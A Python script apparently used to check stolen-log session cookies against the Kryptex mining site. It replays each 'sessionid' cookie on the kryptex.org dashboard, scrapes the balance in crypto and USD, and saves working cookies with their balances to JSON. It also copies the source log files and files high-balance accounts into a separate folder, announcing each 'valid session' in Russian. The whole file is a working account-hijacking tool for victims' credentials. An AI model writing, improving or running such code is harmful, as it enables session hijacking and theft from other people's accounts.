# -*- coding: utf-8 -*-
import shutil
import threading

import StandartMethod
import re
import random
import time
import requests
from bs4 import BeautifulSoup
import lxml
import os
import sys
import json

class kryptex_checker():


    @staticmethod
    def create_file(create_path: str, cook: str, path: str, balanc, usd, file):
        valid_path = StandartMethod.StandartMetod.validate_path_log(path)
        balanc = StandartMethod.StandartMetod.validate(balanc)
        dir_path = create_path + f"\\Balance({balanc}) - System({random.randint(0, 99999)})"
        try:
            os.mkdir(dir_path)
        except OSError as error:
            pass
        data = {
            'Path': path,
            'Cookie': cook,
            'Account Info': {
                'Total-balanc': balanc,
                'Usd-balans': usd,
            }
        }
        with open(f'{dir_path}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
            json.dump(data, outfile, indent=4, ensure_ascii=False)
        shutil.copy(f'{file}\\{path}', f'{dir_path}\\{valid_path}')

        settings = StandartMethod.headless.get_settings()['Filter_settings']['Kryptex']
        try:
            os.mkdir(f'{create_path}\\{settings["Full_log"]}')
        except:
            pass
        try:
            os.mkdir(f'{create_path}\\{settings["Balanc_path"]}')
        except:
            pass
        st = ''
        for i in balanc:
            if str(i).isdigit() or str(i) == '.':
                st += i
        path_balanc_log = f'{create_path}\\{settings["Balanc_path"]}\\Balance({balanc}) - System({random.randint(0,99999)})'
        if float(st) >= float(settings['Filter_balanc']):
            try:
                os.mkdir(path_balanc_log)
            except:
                pass
            with open(f'{path_balanc_log}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
                json.dump(data, outfile, indent=4, ensure_ascii=False)
            shutil.copy(f'{file}\\{path}', f'{path_balanc_log}\\{valid_path}')
        shutil.copy(f'{file}\\{path}', f'{create_path}\\{settings["Full_log"]}\\{valid_path}')

        print(f"\n[{threading.current_thread().name}] Kryptex Обнаружена валидная сессия\n"
              f"[{threading.current_thread().name}] Баланс: {balanc}\n"
              f"[{threading.current_thread().name}] Путь: {dir_path}")

    @staticmethod
    def checker(dict, account, path_log, file):
        headers = StandartMethod.StandartMetod.get_headers()

        cook = {"sessionid": account['sessionid']}

        req = requests.get('https://www.kryptex.org/site/dashboard?registered=true', headers=headers, cookies=cook)
        soup = BeautifulSoup(req.text, 'lxml')


        try:
            balanc = soup.find('div', id='dashboard').find("div", class_='d-flex align-items-center').find('h3').text
            usd = soup.find('div', id='dashboard').find("div", class_='d-flex align-items-center').find_all('span')[-1].text
            kryptex_checker.create_file(f'{dict}',account['sessionid'], path_log , balanc, usd, file)


        except Exception as ex:
            pass